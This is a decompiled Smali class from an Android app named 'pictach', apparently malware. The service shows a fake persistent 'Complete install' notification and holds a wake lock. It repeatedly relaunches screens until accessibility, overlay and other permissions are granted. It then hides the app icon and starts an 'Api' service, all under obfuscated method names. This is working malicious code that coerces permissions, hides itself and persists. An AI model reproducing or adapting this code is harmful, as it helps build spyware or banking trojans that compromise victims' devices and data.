.class public Lcom/android/pictach/myker;
.super Landroid/app/IntentService;
# ep-aghktvbchvio
.source "codhiuwu.java"

# processed-91929
# compiled-91084

# instance fields
.field wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, ""

    .line 30
    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    const/4 v0, 0x0

    .line 32
    iput-object v0, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    return-void
.end method

.method public static cancelnotification(Landroid/content/Context;I)V
    .locals 1

    const-string v0, "notification"

    .line 53
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/NotificationManager;

    .line 54
    invoke-virtual {p0, p1}, Landroid/app/NotificationManager;->cancel(I)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    .line 48
    invoke-super {p0, p1}, Landroid/app/IntentService;->onBind(Landroid/content/Intent;)Landroid/os/IBinder;

    move-result-object p1

    return-object p1
.end method

.method public onDestroy()V
    .locals 2

    .line 35
    invoke-super {p0}, Landroid/app/IntentService;->onDestroy()V

    .line 36
    iget-object v0, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 38
    iget-object v0, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    .line 40
    iget-object v0, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_0
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 8

    .line 60
    :try_start_0
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    const/16 v0, 0x1a

    const-string v1, "MyInstall"

    const/4 v2, 0x0

    if-lt p1, v0, :cond_0

    .line 61
    :try_start_1
    const-class p1, Landroid/app/NotificationManager;

    invoke-virtual {p0, p1}, Lcom/android/pictach/myker;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/NotificationManager;

    if-eqz p1, :cond_0

    .line 63
    invoke-virtual {p1, v1}, Landroid/app/NotificationManager;->getNotificationChannel(Ljava/lang/String;)Landroid/app/NotificationChannel;

    move-result-object v3

    if-nez v3, :cond_0

    .line 64
    new-instance v3, Landroid/app/NotificationChannel;

    const-string v4, "Install"

    const/4 v5, 0x4

    invoke-direct {v3, v1, v4, v5}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v4, "Installation"

    .line 65
    invoke-virtual {v3, v4}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 66
    invoke-virtual {v3, v2}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    const/4 v4, 0x0

    .line 67
    invoke-virtual {v3, v4, v4}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 68
    invoke-virtual {p1, v3}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 74
    :cond_0
    new-instance p1, Landroid/content/Intent;

    const-class v3, Lcom/android/pictach/google;

    invoke-direct {p1, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const v3, 0x70008000

    .line 75
    invoke-virtual {p1, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    const/high16 v3, 0xc000000

    .line 76
    invoke-static {p0, v2, p1, v3}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object p1

    .line 79
    new-instance v3, Landroid/support/v4/app/NotificationCompat$Builder;

    invoke-direct {v3, p0, v1}, Landroid/support/v4/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v1, 0x106000d

    .line 81
    invoke-virtual {v3, v1}, Landroid/support/v4/app/NotificationCompat$Builder;->setSmallIcon(I)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v1

    const-string v3, "Complete install"

    .line 82
    invoke-virtual {v1, v3}, Landroid/support/v4/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v1

    const-string v3, "Click Here to Complete installing"

    .line 83
    invoke-virtual {v1, v3}, Landroid/support/v4/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v1

    const/4 v3, 0x1

    .line 84
    invoke-virtual {v1, v3}, Landroid/support/v4/app/NotificationCompat$Builder;->setPriority(I)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v1

    const-string v4, "call"

    .line 85
    invoke-virtual {v1, v4}, Landroid/support/v4/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v1

    const/4 v4, -0x1

    .line 86
    invoke-virtual {v1, v4}, Landroid/support/v4/app/NotificationCompat$Builder;->setDefaults(I)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v1

    .line 87
    invoke-virtual {v1, v3}, Landroid/support/v4/app/NotificationCompat$Builder;->setOngoing(Z)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v1

    .line 88
    invoke-virtual {v1, v2}, Landroid/support/v4/app/NotificationCompat$Builder;->setAutoCancel(Z)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object v1

    .line 89
    invoke-virtual {v1, p1, v3}, Landroid/support/v4/app/NotificationCompat$Builder;->setFullScreenIntent(Landroid/app/PendingIntent;Z)Landroid/support/v4/app/NotificationCompat$Builder;

    move-result-object p1

    .line 91
    invoke-static {p0}, Landroid/support/v4/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroid/support/v4/app/NotificationManagerCompat;

    const/16 v1, 0x60b

    .line 92
    invoke-virtual {p1}, Landroid/support/v4/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    invoke-virtual {p0, v1, p1}, Lcom/android/pictach/myker;->startForeground(ILandroid/app/Notification;)V

    const-string p1, "power"

    .line 94
    invoke-virtual {p0, p1}, Lcom/android/pictach/myker;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/os/PowerManager;

    .line 95
    iget-object v1, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-nez v1, :cond_1

    const-string v1, "Android:Watchlock"

    .line 97
    invoke-virtual {p1, v3, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    iput-object p1, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 99
    :cond_1
    iget-object p1, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz p1, :cond_2

    .line 101
    iget-object p1, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result p1

    if-nez p1, :cond_2

    .line 103
    iget-object p1, p0, Lcom/android/pictach/myker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->acquire()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    .line 112
    :catch_0
    :cond_2
    :goto_0
    :try_start_2
    sget-object p1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    sget v1, Lcom/android/pictach/Utils;->speedTime:I

    int-to-long v4, v1

    invoke-virtual {p1, v4, v5}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 118
    :catch_1
    :try_start_3
    const-class p1, Lcom/android/pictach/Firebase;

    invoke-static {p0, p1}, Lcom/android/pictach/Utils;->IA_love_E(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p1

    const/16 v1, 0xdac

    const/high16 v4, 0x40000000    # 2.0f

    const/high16 v5, 0x20000000

    const/high16 v6, 0x10000000

    if-nez p1, :cond_3

    .line 119
    invoke-static {}, Lcom/android/pictach/Utils;->NeedSuper()Z

    move-result p1

    if-eqz p1, :cond_3

    .line 121
    invoke-static {p0}, Lcom/android/pictach/Utils;->GS_love_B(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_2

    .line 123
    sget p1, Lcom/android/pictach/Utils;->Trys:I

    add-int/2addr p1, v3

    sput p1, Lcom/android/pictach/Utils;->Trys:I

    .line 127
    sget p1, Lcom/android/pictach/Utils;->Trys:I

    const/4 v7, 0x5

    if-lt p1, v7, :cond_2

    .line 129
    sput v2, Lcom/android/pictach/Utils;->Trys:I

    .line 131
    sput v1, Lcom/android/pictach/Utils;->speedTime:I

    .line 133
    new-instance p1, Landroid/content/Intent;

    const-class v1, Lcom/android/pictach/google;

    invoke-direct {p1, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 134
    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 135
    invoke-virtual {p1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 136
    invoke-virtual {p1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 133
    invoke-virtual {p0, p1}, Lcom/android/pictach/myker;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 149
    :cond_3
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x17

    if-lt p1, v7, :cond_4

    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_4

    invoke-static {}, Lcom/android/pictach/Utils;->NeedSuper()Z

    move-result p1

    if-nez p1, :cond_4

    .line 151
    sget-object p1, Lcom/android/pictach/Utils;->shown:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-nez p1, :cond_2

    const/16 p1, 0x1388

    .line 153
    sput p1, Lcom/android/pictach/Utils;->speedTime:I

    .line 154
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Utils;->shown:Ljava/lang/Boolean;

    .line 155
    new-instance p1, Landroid/content/Intent;

    const-class v1, Lcom/android/pictach/Firebasekit;

    invoke-direct {p1, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 156
    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 155
    invoke-virtual {p0, p1}, Lcom/android/pictach/myker;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 164
    :cond_4
    invoke-static {}, Lcom/android/pictach/Utils;->PERMISSIONS()[Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1}, Lcom/android/pictach/Utils;->H__love_P(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_6

    .line 165
    sget-object p1, Lcom/android/pictach/Utils;->asked:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-nez p1, :cond_5

    .line 167
    sput v1, Lcom/android/pictach/Utils;->speedTime:I

    .line 168
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Utils;->asked:Ljava/lang/Boolean;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 172
    goto/16 :goto_0

    .line 179
    :try_start_4
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Utils;->asked:Ljava/lang/Boolean;

    goto/16 :goto_0

    :cond_5
    const/16 p1, 0x7d0

    .line 182
    sput p1, Lcom/android/pictach/Utils;->speedTime:I

    goto/16 :goto_0

    .line 189
    :cond_6
    sget-boolean p1, Lcom/android/pictach/love;->Is_love_Hidden:Z

    if-nez p1, :cond_7

    .line 191
    sput-boolean v3, Lcom/android/pictach/love;->Is_love_Hidden:Z

    .line 192
    invoke-virtual {p0}, Lcom/android/pictach/myker;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    const-string v1, "I#C#O#N#S#C#A#N#E#R"

    invoke-static {p1, v1}, Lcom/android/pictach/Utils;->SwapMe(Landroid/content/Context;Ljava/lang/String;)V

    .line 196
    :cond_7
    sget-boolean p1, Lcom/android/pictach/Utils;->iamworking:Z
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    if-nez p1, :cond_a

    .line 199
    :try_start_5
    sput-boolean v3, Lcom/android/pictach/love;->allok:Z

    .line 200
    sput-boolean v3, Lcom/android/pictach/Utils;->iamworking:Z

    .line 201
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Firebase;->Firebasebypass:Ljava/lang/Boolean;

    .line 202
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Firebase;->FirebaseFOR_prim:Ljava/lang/Boolean;

    .line 203
    sput-boolean v3, Lcom/android/pictach/Firebase;->FirebaseCheckPrims:Z

    .line 208
    const-class p1, Lcom/android/pictach/Api;

    invoke-static {p1, p0}, Lcom/android/pictach/LoveApi0;->illacarterithomsonwtranskschemeijohnstontscreeningnglennomaybehoptimizeelikelyfcopxchallengeh49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_8

    .line 209
    invoke-virtual {p0}, Lcom/android/pictach/myker;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const v1, 0x7f090014

    invoke-virtual {p1, v1}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/android/pictach/Utils;->p_Utils_r:Ljava/lang/String;

    .line 211
    new-instance p1, Landroid/content/Intent;

    const-class v1, Lcom/android/pictach/Api;

    invoke-direct {p1, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, Lcom/android/pictach/myker;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 215
    :cond_8
    invoke-static {p0}, Lcom/android/pictach/Utils;->is_dozemode(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_9

    .line 216
    new-instance p1, Landroid/content/Intent;

    const-class v1, Lcom/android/pictach/Firebases;

    invoke-direct {p1, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 217
    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 218
    invoke-virtual {p1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 219
    invoke-virtual {p1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 220
    invoke-virtual {p0, p1}, Lcom/android/pictach/myker;->startActivity(Landroid/content/Intent;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    .line 225
    :catch_2
    :cond_9
    :try_start_6
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt p1, v0, :cond_a

    const/16 p1, 0x1a14

    .line 226
    invoke-static {p0, p1}, Lcom/android/pictach/myker;->cancelnotification(Landroid/content/Context;I)V

    .line 227
    invoke-virtual {p0, v3}, Lcom/android/pictach/myker;->stopForeground(Z)V

    .line 228
    invoke-virtual {p0}, Lcom/android/pictach/myker;->stopSelf()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :catch_3
    :cond_a
    const/16 p1, 0x61a8

    .line 234
    :try_start_7
    sput p1, Lcom/android/pictach/Utils;->speedTime:I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0

    goto/16 :goto_0

    :catch_4
    return-void
.end method
